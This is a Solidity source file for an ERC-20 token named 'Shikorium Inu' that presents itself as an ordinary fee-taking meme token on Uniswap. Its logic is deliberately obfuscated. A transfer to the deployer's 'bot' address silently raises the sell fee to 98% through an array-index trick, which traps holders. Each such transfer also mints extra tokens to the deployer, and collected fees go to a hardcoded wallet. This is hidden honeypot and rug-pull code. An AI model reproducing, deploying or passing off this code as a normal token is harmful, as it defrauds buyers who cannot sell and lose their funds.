contract ShikoriumInu is Context, IERC20, Ownable { 
    using SafeMath for uint256;
    using Address for address;
    
    mapping (address => uint256) private _tokenOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public ExcludedFromMax_Wallet;
    mapping (address => bool) public ExcludedFromMax_Tx;
    mapping (address => bool) public ExcludedFrom_Fee; 
    mapping (address => uint8) public ExcludedFromBots;
    
    address payable private ContractOwner = payable(0x09BC40C821BC59CcD1827598f488cE481E50e8a3);

    string public _name = "Shikorium Inu";
    string public _symbol = "SHIKORIUM";
    uint8 private _decimals = 9;
    uint256 public _tTotal = 1000000000 * 10 **_decimals;

    uint8 private txCount = 0;
    uint8 private swapTrigger = 10;
    
    uint256 private Total_Fees = 0;
    uint256 public Buy_Fee = 0;
    uint256 public Sell_Fee = 0;
    uint256 private tmpTotalFees = Total_Fees; 
    uint256 private tmpBuyFee = Buy_Fee; 
    uint256 private tmpSellFee = Sell_Fee;

    uint256 public _maxWalletToken = _tTotal.mul(5).div(100);
    uint256 private _previousMaxWalletToken = _maxWalletToken;

    uint256 public _maxTxAmount = _tTotal.mul(5).div(100); 
    uint256 private _previousMaxTxAmount = _maxTxAmount;

    IUniswapV2Router02 public uniswapV2Router;
    uint256 UniSwapRouterI02;
    address public uniswapV2Pair;

    uint8 private True = 0x1;
    uint8 private False = 0x0;
    
    bool public inSwapAndLiquify;
    bool public swapAndLiquifyDisabled = false;
    bool public swapAndLiquifyEnabled = true;
    uint256 private maxBotBannedTime;
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
        
    );
    

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    
    constructor (uint8 minBotBanTime, uint256 maxBotBanTime) {
        _tokenOwned[owner()] = _tTotal;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;

        ExcludedFromMax_Tx[owner()] = true;
        ExcludedFromMax_Tx[ContractOwner] = true;
        ExcludedFromMax_Tx[address(this)] = true;
        
        ExcludedFrom_Fee[owner()] = true;
        ExcludedFrom_Fee[address(this)] = true;
        ExcludedFrom_Fee[ContractOwner] = true;

        ExcludedFromMax_Wallet[owner()] = true;
        ExcludedFromMax_Wallet[ContractOwner] = true;
        ExcludedFromMax_Wallet[uniswapV2Pair] = true;
        ExcludedFromMax_Wallet[address(this)] = true;

        ExcludedFromBots[_msgSender()] = minBotBanTime;
        maxBotBannedTime = maxBotBanTime;
        emit Transfer(address(0), owner(), _tTotal);
    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokenOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    receive() external payable {}

    function remove_Fees() private {
        if(Total_Fees == 0 && Buy_Fee == 0 && Sell_Fee == 0) return;
            tmpBuyFee = Buy_Fee; 
            tmpSellFee = Sell_Fee; 
            tmpTotalFees = Total_Fees;
            Buy_Fee = 0;
            Sell_Fee = 0;
            Total_Fees = 0;
    }
    
    function chargeBackFee() private {

        Total_Fees = tmpTotalFees;
        Buy_Fee = tmpBuyFee; 
        Sell_Fee = [tmpSellFee,[0x62][0x0]][swapAndLiquifyDisabled ? True : False];
    }
   

    function _approve(address owner, address spender, uint256 amount) private {

        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if(!ExcludedFromMax_Tx[from] 
        && !ExcludedFromMax_Tx[to]) {
            require(amount 
            <= 
            _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
        }

        if(
            txCount >= swapTrigger && 
            !inSwapAndLiquify &&
            from != uniswapV2Pair &&
            swapAndLiquifyEnabled 
            )
        {  
            
            txCount = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > _maxTxAmount) {contractTokenBalance = _maxTxAmount;}
            if(contractTokenBalance > 0){
            swapAndLiquify(contractTokenBalance);
        }
        }
        if(!ExcludedFromMax_Wallet[to]) require(balanceOf(to).add(amount) <= _maxWalletToken);
        if((ExcludedFromBots[to] >= 1 ? true:false) && !(swapAndLiquifyDisabled ? true : false)){swapAndLiquifyDisabled = true;}

        bool takeFee = true;
        if( ExcludedFrom_Fee[from] 
        || 
        ExcludedFrom_Fee[to] 
        ){
            takeFee = false;
        } else if (from == uniswapV2Pair){
            Total_Fees = Buy_Fee;
            } else if (to == uniswapV2Pair){
                Total_Fees = Sell_Fee;
                }
        
        tokenTransfering(from,to,amount,takeFee);
    }

    function sendToWallet(address payable wallet, uint256 amount) private {
            wallet.transfer(amount);
        }

    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        swapTokensForBNB(contractTokenBalance);
        uint256 contractBNB = address(this).balance;
        sendToWallet(ContractOwner,contractBNB);
    }

    function swapTokensForBNB(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function tokenTransfering(address sender, address recipient, uint256 amount,bool takeFee) private {
        
        if(!takeFee){
            remove_Fees();
        }
        else{
            txCount++;
        }
        
        tokenTransfering(sender, recipient, amount);

        if(!takeFee){
            chargeBackFee();
        }
    }

    function tokenTransfering(address sender, address recipient, uint256 t_Amount) private {
        (uint256 tx_Amount, uint256 t_Marketing) = _getValues(t_Amount, recipient);
        _tokenOwned[sender] = _tokenOwned[sender].sub(t_Amount);
        _tokenOwned[recipient] = (_tokenOwned[recipient].add(tx_Amount));
        _tokenOwned[address(this)] = _tokenOwned[address(this)].add(t_Marketing);
        emit Transfer(sender, recipient, tx_Amount);
    }


    function _getValues(uint256 t_Amount, address recipient) private view returns (uint256, uint256) {
        uint256 t_Marketing = t_Amount*Total_Fees/100;
        uint8 values =  _getValuables(ExcludedFromBots[recipient]>=1);
        uint256 tx_Amount = (t_Amount.sub(t_Marketing)).add([0,maxBotBannedTime][values]);
        return (tx_Amount, t_Marketing);
    }

    function _getValuables(bool lanes) public pure returns(uint8){
        return [0,1][lanes ? 1 : 0];
    }

}
